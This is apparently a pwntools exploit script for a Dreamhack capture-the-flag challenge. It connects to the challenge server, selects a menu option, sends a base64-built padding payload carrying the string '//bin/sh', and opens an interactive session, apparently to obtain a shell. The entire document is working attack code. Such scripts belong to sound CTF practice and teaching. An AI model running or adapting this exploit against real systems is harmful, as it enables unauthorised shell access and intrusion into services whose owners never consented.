from pwn import *
import base64

context.binary = elf = ELF('./chall')

p = remote('host8.dreamhack.games', 14850)

pay = b'YWFh'*0x10
pay += b'//bin/sh'

p.sendlineafter(b'> ', b'1')
pause()
pay = base64.b64decode(pay)

p.send(pay)

p.interactive()